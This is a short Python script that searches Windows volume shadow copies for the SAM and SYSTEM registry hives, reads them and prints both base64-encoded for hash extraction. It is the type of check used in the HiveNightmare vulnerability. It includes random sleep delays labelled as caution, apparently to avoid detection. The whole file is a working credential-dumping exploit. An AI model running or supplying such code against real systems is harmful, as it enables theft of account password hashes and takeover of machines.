from os import stat, stat_result, linesep
from random import random, randint
from time import sleep
from sys import argv
from base64 import b64encode

cautious = False
minimum_checks = 15

def exercise_caution():
    global cautious
    if cautious:
        min_sleep = 1
        max_sleep = 5
        sleep(random() * randint(min_sleep,max_sleep))

def get_newest_hashes():
    global cautious
    global minimum_checks

    sam_hive = '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{i}\\Windows\\System32\\config\\SAM'
    sys_hive = '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{i}\\Windows\\System32\\config\\SYSTEM'

    hive_bases = [sam_hive, sys_hive]
    hive_n = 1
    newest = (None, stat_result([0 for i in range(10)]))
    finding_newest_hive = True
    newest_hashes = {'sam':None, 'sys':None}
    access_error = False
    not_found_error = False

    while finding_newest_hive:
        try:
            current_sam_hive = hive_bases[0].format(i=hive_n)
            current_stat = stat(current_sam_hive)
            if current_stat.st_ctime > newest[1].st_ctime:
                newest = (hive_n, current_stat)
            exercise_caution()
        except PermissionError as e:
            # permission error: report not vulnerable
            access_error = True
            print(f"permission error on {hive_n}")
        except FileNotFoundError as e:
            # reached the end
            not_found_error = True
            if hive_n >= minimum_checks:
                finding_newest_hive = False
                break
        hive_n += 1

    if newest[0] is not None:
        for hive_base in hive_bases:
            hive = hive_base.format(i=newest[0])
            with open(hive, 'rb') as f:
                hive_text = f.read()
            if hive_base == sam_hive:
                newest_hashes['sam'] = hive_text
            else:
                newest_hashes['sys'] = hive_text

    if access_error:
        print("access error")
    elif not_found_error:
        print("not found error")
        

    return newest_hashes

def main():
    hashes = get_newest_hashes()
    if not any([hashes['sys'], hashes['sam']]):
        print("not vulnerable.")
    else:
        output_string = 'DUMP_SAM{nl}{sam_hive}{nl}DUMP_SYS{nl}{sys_hive}'
        
        sam_hive = b64encode(hashes['sam'])
        sys_hive = b64encode(hashes['sys'])

        # print('DUMP_SAM')
        # print(sam_hive)
        # print('DUMP_SYS')
        # print(sys_hive)
        
        print(output_string.format(nl=linesep, sam_hive=sam_hive, sys_hive=sys_hive))
        print("Hashes collected.")

main()